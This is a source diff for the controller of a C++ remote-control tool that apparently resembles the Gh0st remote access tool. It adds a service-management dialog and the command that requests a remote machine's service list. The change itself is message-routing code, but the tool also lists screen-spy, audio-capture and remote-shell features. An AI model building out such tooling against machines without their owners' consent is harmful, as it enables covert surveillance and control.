@@ -86,7 +86,7 @@ BEGIN_MESSAGE_MAP(CCcRemoteDlg, CDialogEx)
 	ON_MESSAGE(WM_OPENSCREENSPYDIALOG, OnOpenScreenSpyDialog)
 	ON_MESSAGE(WM_OPENMANAGERDIALOG, OnOpenManagerDialog)
 	ON_MESSAGE(WM_OPENAUDIODIALOG, OnOpenAudioDialog)
-	
+	ON_MESSAGE(WM_OPENSERVERDIALOG, OnOpenServerDialog)
 
 	//-------------系统-------------
 	ON_WM_SYSCOMMAND()
@@ -559,6 +559,8 @@ void CCcRemoteDlg::OnOnlineRegist()
 void CCcRemoteDlg::OnOnlineServer()
 {
 	// TODO: 在此添加命令处理程序代码
+	BYTE	bToken = COMMAND_SERVICES;         //赋值一个宏 然后发送到服务端，服务端COMMAND_SYSTEM
+	SendSelectCommand(&bToken, sizeof(BYTE));
 }
 
 
@@ -808,6 +810,9 @@ void CCcRemoteDlg::ProcessReceiveComplete(ClientContext *pContext)
 		case SHELL_DLG:
 			((CShellDlg *)dlg)->OnReceiveComplete();
 			break;
+		case SERVER_DLG:
+			((CServerDlg *)dlg)->OnReceiveComplete();
+			break;
 		default:
 			break;
 		}
@@ -870,6 +875,9 @@ void CCcRemoteDlg::ProcessReceiveComplete(ClientContext *pContext)
 		break;
 	case TOKEN_SHELL_START:
 		g_pCcRemoteDlg->PostMessage(WM_OPENSHELLDIALOG, 0, (LPARAM)pContext);
+		break;
+	case TOKEN_SERVERLIST:
+		g_pCcRemoteDlg->PostMessage(WM_OPENSERVERDIALOG, 0, (LPARAM)pContext);
 		break;
 		// 命令停止当前操作
 	default:
@@ -1081,6 +1089,21 @@ LRESULT CCcRemoteDlg::OnOpenAudioDialog(WPARAM wParam, LPARAM lParam)
 	return 0;
 }
 
+//服务管理窗口
+LRESULT CCcRemoteDlg::OnOpenServerDialog(WPARAM wParam, LPARAM lParam)
+{
+	ClientContext	*pContext = (ClientContext *)lParam;
+	CServerDlg	*dlg = new CServerDlg(this, m_iocpServer, pContext);  //动态创建CSystemDlg
+
+	// 设置父窗口为卓面
+	dlg->Create(IDD_SERVERDLG, GetDesktopWindow());      //创建对话框
+	dlg->ShowWindow(SW_SHOW);                      //显示对话框
+
+	pContext->m_Dialog[0] = SERVER_DLG;              //这个值用做服务端再次发送数据时的标识
+	pContext->m_Dialog[1] = (int)dlg;
+	//先看一下这个对话框的界面再看这个对话框类的构造函数
+	return 0;
+}
 
 //绘制背景图片
 BOOL CCcRemoteDlg::OnEraseBkgnd(CDC* pDC)
